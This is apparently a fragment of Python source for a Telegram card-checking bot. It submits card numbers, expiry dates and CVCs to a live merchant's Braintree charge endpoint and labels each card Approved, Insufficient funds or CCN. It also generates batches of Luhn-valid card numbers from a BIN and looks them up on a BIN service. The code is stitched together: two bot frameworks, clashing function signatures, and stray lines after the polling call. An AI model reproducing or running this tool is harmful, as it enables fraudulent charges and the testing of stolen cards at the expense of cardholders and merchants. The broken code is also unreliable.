        'token': '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',
    }
    start_time = time.time()
    response = requests.post('https://app.brandmark.io/v3/charge.php', cookies=cookies, headers=headers, json=json_data)
    payment_request_time = time.time() - start_time
    message = response.json()['message']
    
    # Determine the appropriate message format and whether to do a 3DS lookup
    if 'approved' in message.lower() or 'insufficient funds' in message.lower() or 'card issuer declined cvv' in message.lower():
        # Get 3DS lookup result
        if 'approved' in message.lower():
            color = COLOR_GREEN
            formatted_message = (
                f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n\n"
                f"𝗖𝗮𝗿𝗱: {n}|{mm}|{yy}|{cvc}\n"
                f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree charge 10$\n"
                f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {message}\n\n"
                f"3ds = {vbv(ccx)}"
                f"𝗜𝗻𝗳𝗼: BIN: {bin_data}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
                f"𝗧𝗶𝗺𝗲: {payment_request_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
            )
            print(f'{n}|{mm}|{yy}|{cvc} -> {color}{message}{COLOR_RESET}')

        elif 'insufficient funds' in message.lower():
            color = COLOR_BLUE
            formatted_message = (
                f"𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗳𝘂𝗻𝗱𝘀 ❌\n\n"
                f"𝗖𝗮𝗿𝗱: {n}|{mm}|{yy}|{cvc}\n"
                f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree charge 10$\n"
                f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {message.replace('Your payment could not be taken. Please try again or use a different payment method', '')}\n\n"
                f"3ds = {vbv(ccx)}"
                f"𝗜𝗻𝗳𝗼: BIN: {bin_data}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
                f"𝗧𝗶𝗺𝗲: {payment_request_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
            )

        elif 'card issuer declined cvv' in message.lower():
            color = COLOR_BLUE
            formatted_message = (
                f"CCN ☑️\n\n"
                f"𝗖𝗮𝗿𝗱: {n}|{mm}|{yy}|{cvc}\n"
                f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree charge 10$\n"
                f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {message.replace('Your payment could not be taken. Please try again or use a different payment method', '')}\n\n"
                f"3ds = {vbv(ccx)}"
                f"𝗜𝗻𝗳𝗼: BIN: {bin_data}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
                f"𝗧𝗶𝗺𝗲: {payment_request_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
            )

    else:
        color = COLOR_RESET
        formatted_message = (
            f"𝗙𝗮𝗶𝗹𝗲𝗱 ❌\n\n"
            f"𝗖𝗮𝗿𝗱: {n}|{mm}|{yy}|{cvc}\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree charge 25$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {message}\n\n"
            f"3ds = {vbv(ccx)}"
            f"𝗜𝗻𝗳𝗼: BIN: {bin_data}\n"
            f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n\n"
            f"𝗧𝗶𝗺𝗲: {payment_request_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
        )
    return formatted_message


    
async def process_card(update: Update, context):

    # Extract the message text (assuming the user sends the card info directly)
    message = update.message.text

    # Send the initial "Processing..." message
    processing_message = await update.message.reply_text("Processing...")
    message1 = clean_input(message)
    # Call the Tele function to process the message (this could be your actual processing logic)

    
    if "chk" in message :
        response = Tele(message1)
    elif "vbv" in message :
        response = vbv(message1)
    else :
        response = generate_credit_card(message) 
    # After processing, edit the "Processing..." message with the actual response
    await processing_message.edit_text(response)

# Main function to run the bot
async def start_bot(update: Update, context):
    await update.message.reply_text("Welcome! Send your credit card info in the format 4033060081706027|05|27|917.")

def main():
    # Create the application and pass the bot token
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Add handlers
    app.add_handler(CommandHandler("start", start_bot))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_card))

    # Start the bot
    app.run_polling()

if __name__ == '__main__':
    main()



















































def generate_credit_card(message, bot, ko):
    try:
        # البحث عن رقم البطاقة والبيانات الأخرى في الرسالة
        match = re.search(r'(\d{6,16})\D*(\d{1,2}|xx)?\D*(\d{2,4}|xx)?\D*(\d{3,4}|xxx)?', message.text)
        if match:
            card_number = match.group(1)
            
            # التحقق من صحة BIN
            if len(card_number) < 6 or card_number[0] not in ['4', '5', '3', '6']:
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>BIN not recognized. Please enter a valid BIN ❌</b>''', parse_mode="HTML")
                return

            bin = card_number[:6]
            response_message = ""

            # توليد 10 بطاقات ائتمان
            for _ in range(10):
                month = int(match.group(2)) if match.group(2) and match.group(2) != 'xx' else random.randint(1, 12)
                year = int(match.group(3)) if match.group(3) and match.group(3) != 'xx' else random.randint(2025, 2029)

                # تحديد طول الـ CVV بناءً على نوع البطاقة
                if card_number[:1] == "3":
                    cvv = int(match.group(4)) if match.group(4) and match.group(4) != 'xxx' else random.randint(1000, 9999)
                else:
                    cvv = int(match.group(4)) if match.group(4) and match.group(4) != 'xxx' else random.randint(100, 999)

                # توليد بطاقة ائتمان مع الشهر، السنة، والـ CVV
                credit_card_info = generate_credit_card_info(card_number, month, year, cvv)
                response_message += f"<code>{credit_card_info}</code>\n"

            # جلب معلومات الـ BIN
            try:
                data = requests.get(f'https://bins.antipublic.cc/bins/{bin}').json()
                brand = data.get('brand', 'Unknown')
                card_type = data.get('type', 'Unknown')
                country = data.get('country_name', 'Unknown')
                country_flag = data.get('country_flag', 'Unknown')
                bank = data.get('bank', 'Unknown')
            except:
                brand = 'Unknown'
                card_type = 'Unknown'
                country = 'Unknown'
                country_flag = 'Unknown'
                bank = 'Unknown'

            # إرسال النتيجة إلى المستخدم
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"𝐁𝐈𝐍 ➜  {bin}\n\n{response_message}\n𝐁𝐈𝐍 𝐈𝐧𝐟𝐨 ➜ {brand} - {card_type}\n𝐁𝐚𝐧𝐤 ➜  {bank}\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} - {country_flag}", parse_mode="HTML")
        else:
            # في حالة الإدخال غير الصحيح
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>Invalid input. Please provide a BIN (Bank Identification Number) that is at least 6 digits but not exceeding 16 digits. 
Example: <code>/gen 412236xxxx |xx|2023|xxx</code></b>''', parse_mode="HTML")
    
    except IndexError:
        # معالجة الخطأ إذا كانت القائمة فارغة أو بها مشكلة
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="<b>BIN not recognized. Please enter a valid BIN ❌</b>")
    
    except Exception as e:
        # معالجة أي أخطاء غير متوقعة
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"An error occurred: {str(e)}")

def generate_credit_card_info(card_number, expiry_month, expiry_year, cvv):
    generated_num = str(card_number)
    if card_number[:1] == "5" or card_number[:1] == "4" or card_number[:1] == "6":
        while len(generated_num) < 15:
            generated_num += str(random.randint(0, 9))
        check_digit = generate_check_digit(generated_num)
        credit_card_number = generated_num + str(check_digit)
        return f"{credit_card_number}|{str(expiry_month).zfill(2)}|{str(expiry_year)[-2:]}|{cvv}"
    elif card_number[:1] == "3":
        while len(generated_num) < 14:
            generated_num += str(random.randint(0, 9))
        check_digit = generate_check_digit(generated_num)
        credit_card_number = generated_num + str(check_digit)
        return f"{credit_card_number}|{str(expiry_month).zfill(2)}|{str(expiry_year)[-2:]}|{cvv}"

def generate_check_digit(num):
    num_list = [int(x) for x in num]
    for i in range(len(num_list) - 1, -1, -2):
        num_list[i] *= 2
        if num_list[i] > 9:
            num_list[i] -= 9
    return (10 - sum(num_list) % 10) % 10

def luhn_checksum(card_number):
    digits = [int(x) for x in card_number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for digit in even_digits:
        checksum += sum(divmod(digit * 2, 10))
    return checksum % 10

@bot.message_handler(func=lambda message: message.text.lower().startswith('.gen') or message.text.lower().startswith('/gen'))
def respond_to_vbv(message):
	ko = (bot.reply_to(message, "<b>Generating cards...⌛</b>",parse_mode="HTML").message_id)
	generate_credit_card(message,bot,ko)
            # طلب معلومات الـ BIN من API
data = requests.get(f'https://bins.antipublic.cc/bins/{bin}').json()
# بدء تشغيل البوت
bot.polling()


def handle_card(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    message_text = update.message.text

    # Ensure card format starts with `.vbv` prefix
    if not message_text.startswith('.vbv'):
        update.message.reply_text("Please send card in the format `.vbv card_number|mm|yy|cvc`.")
        return

    # Check if user is in cooldown
    current_time = time.time()
    if user_id in last_request_time:
        time_since_last = current_time - last_request_time[user_id]
        if time_since_last < 30:
            remaining_time = int(30 - time_since_last)
            warning_message = update.message.reply_text(f"🛑 Anti-spam: Please wait {remaining_time} seconds.")
            sleep(2)
            try:
                warning_message.edit_text(f"🛑 Anti-spam: {remaining_time} seconds remaining.")
            except BadRequest:
                pass
            return

    # Set user cooldown
    last_request_time[user_id] = current_time
    print(user_id)

    # Send processing message
    processing_message = update.message.reply_text("Processing card...")

    # Process card details
    card_info = message_text.replace('.vbv ', '').strip()
    response_message = process_card(card_info)

    # Edit the message with the final response
    try:
        processing_message.edit_text(response_message)
    except BadRequest:
        pass
